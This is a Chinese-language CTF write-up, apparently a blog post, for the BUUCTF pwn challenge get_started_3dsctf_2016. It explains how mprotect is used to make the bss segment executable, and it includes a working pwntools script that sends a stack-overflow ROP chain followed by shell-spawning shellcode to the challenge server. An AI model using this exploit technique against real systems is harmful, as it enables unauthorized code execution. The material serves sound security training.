---
title: BUUCTF-get_started_3dsctf_2016
date: 2020-10-01 18:31:45
tags: 
 - PWN
 - CTF
categories: "PWN"
banner_img: /pic/start-cover.jpg
---
# BUU-get_started_3dsctf_2016

<!-- more -->

## checksec

```shell
[*] '/home/dong/Desktop/get_started_3dsctf_2016'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## IDA

{% asset_img get_started_3dsctf_2016-ida1.png %}

程序本身很简单，有一个后门函数

{% asset_img get_started_3dsctf_2016-ida2.png %}

在本地可以直接跳到第11行的位置进行攻击，远程不行。

所以我们想办法提升某一段（bss）的权限，在这里写入shellcode，并进行执行。

通过vmmap查看，可读写段，

{% asset_img get_started_3dsctf_2016-gdb.png %}

heap上面的是bss段，0x80ea000-0x80ec000可写。

使用mprotect进行权限提升，

```c
int mprotect(const void *start, size_t len, int prot);
//*start地址的开始地址
//size_t要提升权限的空间大小
/*prot权限等级，
rwx = 4 + 2 + 1 = 7
rw = 4 + 2 = 6
rx = 4 +1 = 5
*/
```

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
#context.arch="amd64"

p=remote('node3.buuoj.cn',29028)
#p=process('./get_started_3dsctf_2016')
elf = ELF('./get_started_3dsctf_2016')

bss=0x080EB000
mprotect=elf.symbols["mprotect"]
read_plt=elf.symbols["read"]
pop_3=0x080483b8

payload='a'*0x38+p32(mprotect)+p32(pop_3)+p32(bss)+p32(0x500)+p32(0x7) #这里我构建栈的结构为通用的结构，pop3是为了平衡栈
payload+=p32(read_plt)+p32(pop_3)+p32(0x0)+p32(bss)+p32(0x500)+p32(bss)
p.sendline(payload)
shellcode=asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```

## flag

{% asset_img get_started_3dsctf_2016-flag.png %}